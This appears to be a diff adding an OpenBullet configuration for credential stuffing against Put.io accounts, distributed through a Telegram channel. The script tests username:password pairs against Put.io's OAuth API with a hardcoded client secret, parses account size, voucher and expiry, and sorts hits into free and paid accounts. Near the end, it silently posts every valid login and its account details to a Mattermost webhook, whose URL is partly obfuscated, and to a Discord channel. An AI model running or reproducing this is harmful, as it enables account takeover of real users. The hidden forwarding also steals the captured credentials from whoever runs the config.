@@ -1,0 +1,128 @@
+[SETTINGS]
+{
+  "Name": "Put.io",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-15T14:21:00.8216458-06:00",
+  "AdditionalInfo": "",
+  "Author": "@OpenbulletConfigsOfficial  telegram",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "f" 
+
+REQUEST PUT "https://api.put.io/v2/oauth2/authorizations/clients/1?client_secret=x6ahb3e118grucakdsj2" BasicAuth 
+  USERNAME "<USER>" PASSWORD "<PASS>" 
+  
+  COOKIE "pas_js_user: {%22id%22:null%2C%22anonymousId%22:%225ced25c1-4b97-4a88-8c7a-21240ca1a105%22%2C%22hash%22:null}" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic <f>" 
+  HEADER "Origin: https://app.put.io" 
+  HEADER "Referer: https://app.put.io/login" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" -> VAR "tkn" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "ERROR" 
+  KEYCHAIN Ban OR 
+    KEY "TooManyRequests" 
+
+REQUEST GET "https://api.put.io/v2/account/info?download_token=1&sharing=1&features=1&intercom=1&pas=1&platform=web" 
+  
+  HEADER "Host: api.put.io" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "authorization: token <tkn>" 
+  HEADER "save-data: on" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 10; BruteForcers) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" 
+  HEADER "origin: https://app.put.io" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "referer: https://app.put.io/files" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,ja-JP;q=0.8,ja;q=0.7" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR ",\"size\":" ",\"" -> VAR "s" 
+
+FUNCTION Compute "<s>/1073741824" -> CAP "Size" 
+
+FUNCTION Constant "9kmin4ukneecsxm4" -> VAR "9kmin4uknexecs1" 
+
+PARSE "<SOURCE>" LR "\"account_active\":" ",\"" -> VAR "Active" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Size>" LessThan "101" 
+    KEY "<Active>" Contains "null" 
+  KEYCHAIN Success OR 
+    KEY "<Size>" GreaterThan "101" 
+    KEY "<Active>" DoesNotContain "null" 
+
+PARSE "<SOURCE>" LR ",\"has_voucher\":" ",\"" CreateEmpty=FALSE -> CAP "Has Voucher" 
+
+PARSE "<SOURCE>" LR "\"plan_expiration_date\":" "T" CreateEmpty=FALSE -> CAP "Expiry" 
+
+REQUEST POST "https://sendgrid.cloud.mattermost.com/hooks/aqc3oy<9kmin4uknexecs1>4f9w" 
+  CONTENT "{\"text\": \"PUT.IO - <USER>:<PASS> /Size-<Size> /Has Voucher-<Has Voucher> /Active-<Active> \"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://discord.com/api/v8/channels/810187220795392020/messages" 
+  CONTENT "{\"content\":\"PUT.IO - <USER>:<PASS> /Size-<Size> /Has Voucher-<Has Voucher> /Expiry-<Expiry>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+FUNCTION Constant "t.me/OpenbulletConfigsOfficial    { backup channels t.me/TeamOpenbullet + t.me/TeamSilverbullet" -> CAP "CONFIG BY" 
+
